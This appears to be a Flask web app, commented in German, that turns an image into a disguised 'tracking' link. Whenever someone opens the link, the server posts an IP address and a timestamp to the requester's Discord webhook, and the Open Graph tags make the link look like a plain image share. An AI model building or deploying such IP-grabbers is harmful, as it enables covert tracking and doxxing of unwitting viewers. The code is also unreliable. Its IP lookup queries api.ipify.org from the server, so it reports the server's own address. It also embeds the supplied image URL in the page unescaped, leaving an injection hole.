from flask import Flask, request, jsonify, send_from_directory
import os
import json
import secrets
from datetime import datetime
import urllib.request
import urllib.parse
import base64

app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/upload', methods=['POST'])
def upload_image():
    try:
        data = request.get_json()
        image_url = data.get('image_url', '').strip()
        webhook_url = data.get('webhook', '').strip()
        
        if not image_url:
            return jsonify({'error': 'Bild-URL ist erforderlich'}), 400
        
        if not webhook_url:
            return jsonify({'error': 'Webhook URL ist erforderlich'}), 400
        
        # Generiere Tracking-ID
        tracking_id = secrets.token_urlsafe(8)
        
        # Speichere Daten in globaler Variable für Vercel
        if not hasattr(app, 'tracking_data'):
            app.tracking_data = {}
        
        app.tracking_data[tracking_id] = {
            'image_url': image_url,
            'webhook_url': webhook_url,
            'tracking_id': tracking_id
        }
        
        # Generiere Tracking-URL ohne Base64
        protocol = 'https://'
        host = request.host
        tracking_url = f"{protocol}{host}/track?id={tracking_id}"
        
        return jsonify({
            'success': True,
            'tracking_id': tracking_id,
            'tracking_url': tracking_url
        })
        
    except Exception as e:
        return jsonify({'error': f'Server-Fehler: {str(e)}'}), 500

@app.route('/track')
def track_image():
    tracking_id = request.args.get('id')
    
    if not tracking_id:
        return "Tracking-ID fehlt", 400
    
    try:
        # Hole Daten aus globaler Variable
        if not hasattr(app, 'tracking_data') or tracking_id not in app.tracking_data:
            return "Tracking-Daten nicht gefunden", 404
            
        tracking_data = app.tracking_data[tracking_id]
        
        # Hole IP-Adresse
        ip_address = "Unbekannt"
        try:
            # Einfachster IP-Service
            response = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5)
            data = json.loads(response.read().decode())
            ip_address = data.get('ip', 'Unbekannt')
        except:
            ip_address = request.remote_addr or "Unbekannt"
        
        # Sende Discord-Benachrichtigung SYNCHRON
        try:
            send_discord_now(tracking_data['webhook_url'], ip_address, tracking_id)
        except Exception as e:
            print(f"Discord Fehler: {e}")
        
        # Zeige Bild
        image_url = tracking_data['image_url']
        
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Tracking Bild">
    <meta property="og:description" content="Jemand hat dein Bild angesehen">
    <meta property="og:image" content="{image_url}">
    <meta property="og:url" content="{request.url}">
    <meta property="og:type" content="website">
    <style>
        body {{ 
            margin: 0; 
            padding: 0; 
            background: #000; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }}
        img {{ 
            max-width: 100%; 
            height: auto; 
            max-height: 90vh;
            object-fit: contain;
        }}
    </style>
</head>
<body>
    <img src="{image_url}" alt="Tracking Bild">
</body>
</html>
        """
        
    except Exception as e:
        return f"Fehler: {str(e)}", 500

def send_discord_now(webhook_url, ip_address, tracking_id):
    """Sendet Discord-Nachricht sofort"""
    # Einfachste mögliche Nachricht
    message = f"🔍 Bild angesehen!\nIP: {ip_address}\nZeit: {datetime.now().strftime('%H:%M:%S')}\nID: {tracking_id}"
    
    # Einfachster möglicher Request
    data = {"content": message}
    
    req = urllib.request.Request(
        webhook_url,
        data=json.dumps(data).encode('utf-8'),
        headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
    )
    
    # Sende synchron
    with urllib.request.urlopen(req, timeout=10) as response:
        result = response.read().decode()
        print(f"Discord Response: {result}")
        return result

@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy'})

# Vercel Handler
def handler(request):
    return app(request)

if __name__ == '__main__':
    app.run(debug=True)
